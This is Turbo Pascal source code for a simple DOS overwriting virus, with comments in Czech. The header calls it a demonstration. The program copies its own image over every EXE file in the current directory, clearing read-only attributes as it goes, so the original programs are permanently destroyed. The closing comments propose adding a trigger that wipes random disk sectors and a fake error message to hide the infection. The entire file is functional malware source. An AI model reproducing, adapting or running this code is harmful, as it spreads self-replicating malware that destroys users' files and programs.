

program vir1;

(* Turbo Pascal 4.0                                             *)
(* velmi primitivni virus pro demonstracni ucely                *)
(* infikuje vsechny EXE soubory v aktualnim adresari            *)
(* napadeny program je virem prepsan a navzdy znicen!!          *)
(* funguje pocinaje DOS 3.0,protoze vyuziva ukladani jmena
   provadeneho programu do environmentu                         *)
(* pripadne I/O chyby skonci havarii,protoze spinac $I je vy-
   pnut a program netestuje ioresult                            *)
(* program pro jednoduchost netestuje pripadne zavirovani,jed-
   noduse preplacne sam sebou jakykoli EXE soubor               *)
(* EXE soubor po prekladu ma delku 3616 bytu. Po spusteni vir
   prepise sam sebe na delku 3712 bytu. Na tuto delku jsou
   zvetseny pripadne kratsi soubory EXE, u delsich je pouze
   prepsano techto 3712 bytu                                    *)
(* datum a cas zavirovaneho souboru je zmenen                   *)

(*$I-*)
(*$V-*)
(*$R-*)
(*$S-*)
(*$F-*)
(*$N-*)
(*$B+*)
(*$M 1024,0,0*)

uses dos;

  const
    virlen=29;                     (* delka viru v nasobcich 128 bytu *)

  type
    str12=string[12];
    sector=array[1..128] of byte;

  var
    buffer:array[1..virlen] of sector;
                               (* sem nacteme puvodni obraz viru z disku *)
    dirinfo:searchrec;             (* pro prohledavani adresare *)
    regs:registers;
    f:file;                        (* netypovany soubor kvuli blockwrite *)

procedure prepisvirem(name:str12);
  var
    tim:longint;
    atr,pomatr:word;               (* uschova puvodnich atributu souboru *)
  begin
    assign(f,name);
    getfattr(f,atr);
    pomatr:=atr and $0FFFE;        (* aby nebyl read only *)
    if (atr and readonly)<>0 then
      begin
        setfattr(f,pomatr);        (* nastaveni read/write *)
      end;
    reset(f);
    blockwrite(f,buffer,virlen);   (* rozmnozeni viru *)
    close(f);
    if(atr and readonly)<>0 then
      begin
        setfattr(f,atr);           (* zpatky r/o *)
      end;
  end;

function exetest(s:str12):boolean;  (* vrati true,jde-li o EXE soubor *)
  var poms:string[3];
      posb:byte;
  begin
    exetest:=true;
    posb:=pos('.',s);
    if posb=0 then poms:='' else poms:=copy(s,posb+1,3); (* vrati se 3 nebo
                                                            mene  *)
    exetest:=(poms='EXE');
  end;

procedure nactivir;                (* nacte obraz viru do bufferu *)
  var
    atr,pomatr:word;               (* pokud bude r/o,musime menit atributy *)
    name:string[80];
    envirseg:word;                 (* sem ulozime segment environmentu *)
    index:word;
    strindex:byte;
  begin
    envirseg:=memw[prefixseg:$2C]; (* na PSP[2C] je segment environmentu *)
    index:=0;
    repeat
      index:=index+1;
      if index>30000 then halt;    (* v environmentu je neporadek *)
    until meml[envirseg:index]=$00010000;
    index:=index+4;                (* ukazuje na nazev programu *)
    strindex:=1;                   (* budeme plnit retezec      *)
    repeat
      name[strindex]:=chr(mem[envirseg:index]);
      index:=index+1;
      strindex:=strindex+1;
      if strindex>80 then halt;    (* moc dlouhe jmeno souboru   *)
    until mem[envirseg:index]=0;
    name[0]:=chr(strindex-1);      (* prirazujeme delku retezce  *)
    assign(f,name);
    getfattr(f,atr);
    pomatr:=atr and $0FFFE;        (* aby nebyl read only *)
    if (atr and readonly)<>0 then
      begin
        setfattr(f,pomatr);        (* nastaveni read/write *)
      end;
    reset(f);                      (* reset i pro cteni nesnasi r/o soubor *)
    blockread(f,buffer,virlen);
    close(f);
    if(atr and readonly)<>0 then
      begin
        setfattr(f,atr);           (* zpatky r/o *)
      end;
  end;

begin
    nactivir;
    findfirst('*.*',$37,dirinfo);
    while doserror=0 do with dirinfo do
     begin
       if attr<>directory then if exetest(name) then prepisvirem(name);
            (* to bylo rozmnozeni viru *)
       findnext(dirinfo);
     end;

(* tady muzeme na zaklade nahodneho generatoru,pripadne dne v mesici atd.
   udelat neco hrozneho, napr. znicit nahodny sektor na disku             *)

(* tady lze vypsat neco,aby nebylo hned napadne,ze puvodni program ztuhnul,
   napr. "Not enough memory", "Disk I/O error" atd.                       *)

  end.

